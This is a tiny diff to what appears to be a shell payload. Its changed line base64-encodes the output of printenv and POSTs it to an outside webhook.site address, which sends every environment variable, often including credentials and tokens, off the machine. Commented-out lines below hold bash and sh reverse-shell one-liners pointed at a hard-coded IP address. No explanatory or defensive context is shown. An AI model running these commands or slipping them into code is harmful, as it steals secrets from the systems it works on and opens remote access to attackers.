@@ -1,4 +1,4 @@
-var=`id|base64`;curl -X POST -d "data=$var" https://webhook.site/5342f1d7-100d-4546-8007-22cc2d6f9fef
+var=`printenv|base64`;curl -X POST -d "data=$var" https://webhook.site/5342f1d7-100d-4546-8007-22cc2d6f9fef
 
 #sh -i >& /dev/udp/3.123.202.19/80 0>&1
 #bash -i >& /dev/tcp/3.123.202.19/80 0>&1
